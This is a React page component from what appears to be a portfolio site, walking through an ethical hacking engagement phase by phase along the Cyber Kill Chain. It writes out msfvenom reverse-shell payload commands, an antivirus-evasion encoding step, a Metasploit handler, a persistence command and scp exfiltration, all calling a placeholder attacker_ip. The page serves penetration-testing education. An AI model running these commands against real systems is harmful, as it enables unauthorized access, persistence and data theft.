// src/pages/markdown/EthicalHackingPlans.jsx

import React from 'react';
import './CommonStyles.css';

const EthicalHackingPlans = () => {
  return (
    <div className="Report-content">
      <div className="ctf-header">
        <h1>Ethical Hacking Plans</h1>
        <p>
          This is based on a Purdue University paper where I outline a structured, hands-on approach for conducting an ethical hacking engagement. It incorporates a threat-driven methodology aligned with the Cyber Kill Chain, leveraging real-world tools and techniques for each step. Here, I’ll walk through a detailed project setup, focusing on practical implementation, including commands, tools, and the ethical considerations involved.
        </p>
      </div>

      {/* Introduction */}
      <section className="content-section">
        <h2>Project Overview</h2>
        <p>
          The goal of this project is to simulate real-world cyber threats to evaluate an organization's defenses. We’ll follow the Cyber Kill Chain framework as a roadmap for each attack phase, beginning with Reconnaissance and culminating in Actions on Objectives. Our approach emphasizes compliance with legal standards and ethical best practices, ensuring that every step is documented and authorized.
        </p>
      </section>

      {/* Phase 1: Reconnaissance */}
      <section className="content-section">
        <h2>Phase 1: Reconnaissance</h2>
        <p>
          Reconnaissance involves collecting information about the target organization without interacting directly with its systems. This step will focus on OSINT and network scanning.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>OSINT:</strong> Use <strong>theHarvester</strong> to gather subdomains, emails, and other public information.
            <pre><code>theHarvester -d example.com -b google</code></pre>
          </li>
          <li>
            <strong>Network Scanning:</strong> Use <strong>nmap</strong> for port and service discovery.
            <pre><code>nmap -sS -Pn -p- example.com</code></pre>
          </li>
          <li>
            <strong>Passive Recon:</strong> Use <strong>Shodan</strong> to find open ports and services.
            <pre><code>shodan search "example.com"</code></pre>
          </li>
        </ul>
      </section>

      {/* Phase 2: Weaponization */}
      <section className="content-section">
        <h2>Phase 2: Weaponization</h2>
        <p>
          Weaponization involves creating an exploit based on the vulnerabilities identified. Here, we’ll craft a malicious payload that can establish control once delivered.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>Payload Creation:</strong> Use <strong>msfvenom</strong> to create a reverse shell payload.
            <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe &gt; payload.exe</code></pre>
          </li>
          <li>
            <strong>Encoded Payloads:</strong> Obfuscate the payload to bypass antivirus.
            <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 &gt; encoded_payload.exe</code></pre>
          </li>
        </ul>
      </section>

      {/* Phase 3: Delivery */}
      <section className="content-section">
        <h2>Phase 3: Delivery</h2>
        <p>
          Delivery focuses on finding a way to transfer the exploit to the target, often through phishing or social engineering.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>Phishing Email:</strong> Use <strong>SET (Social Engineering Toolkit)</strong> to craft a phishing email.
            <pre><code>setoolkit</code></pre>
            Select options to create an email-based attack vector, customizing the content to mimic legitimate communications.
          </li>
        </ul>
      </section>

      {/* Phase 4: Exploitation */}
      <section className="content-section">
        <h2>Phase 4: Exploitation</h2>
        <p>
          This step involves exploiting the vulnerability to gain initial access. By executing the payload, we can obtain a shell on the target system.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>Meterpreter Shell:</strong> Use <strong>Metasploit</strong> to handle the payload and establish a connection.
            <pre><code>msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST attacker_ip; set LPORT 4444; exploit"</code></pre>
          </li>
        </ul>
      </section>

      {/* Phase 5: Installation */}
      <section className="content-section">
        <h2>Phase 5: Installation</h2>
        <p>
          Installation ensures persistence by installing software that allows continued access. The use of persistence techniques helps maintain control over the compromised system.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>Persistence Module:</strong> Utilize Metasploit’s persistence module.
            <pre><code>run persistence -A -L /var/log/msf -X -i 10 -p 4444 -r attacker_ip</code></pre>
          </li>
        </ul>
      </section>

      {/* Phase 6: Command and Control */}
      <section className="content-section">
        <h2>Phase 6: Command and Control</h2>
        <p>
          Command and Control (C2) refers to maintaining control over the compromised system. The compromised host connects back to the attacker, allowing remote manipulation.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>C2 Server:</strong> Set up a C2 server using Metasploit or a dedicated C2 framework like Cobalt Strike.
          </li>
        </ul>
      </section>

      {/* Phase 7: Actions on Objectives */}
      <section className="content-section">
        <h2>Phase 7: Actions on Objectives</h2>
        <p>
          At this stage, the attacker completes their intended objectives, such as exfiltrating data or performing lateral movement.
        </p>
        <h3>Tools and Techniques</h3>
        <ul>
          <li>
            <strong>Data Exfiltration:</strong> Use <strong>PowerShell</strong> or <strong>scp</strong> for data transfer.
            <pre><code>scp sensitive_data.txt attacker_ip:/location</code></pre>
          </li>
          <li>
            <strong>Privilege Escalation:</strong> Enumerate for privilege escalation with <strong>LinPEAS</strong>.
            <pre><code>./linpeas.sh</code></pre>
          </li>
        </ul>
      </section>

      {/* Legal and Ethical Considerations */}
      <section className="content-section">
        <h2>Legal and Ethical Considerations</h2>
        <p>
          Authorization is crucial before proceeding with testing to ensure that all actions are within legal and ethical boundaries. Documentation and pre-approval should be secured to define the scope and goals clearly.
        </p>
      </section>

      {/* Conclusion */}
      <section className="content-section">
        <h2>Conclusion</h2>
        <p>
          This ethical hacking plan illustrates a practical approach using the Cyber Kill Chain framework. Each phase is structured to simulate a real-world cyber-attack in a controlled, compliant manner, helping organizations reinforce their defenses. This project highlights the importance of documentation, authorization, and a thorough understanding of both technical and ethical requirements.
        </p>
      </section>
    </div>
  );
};

export default EthicalHackingPlans;
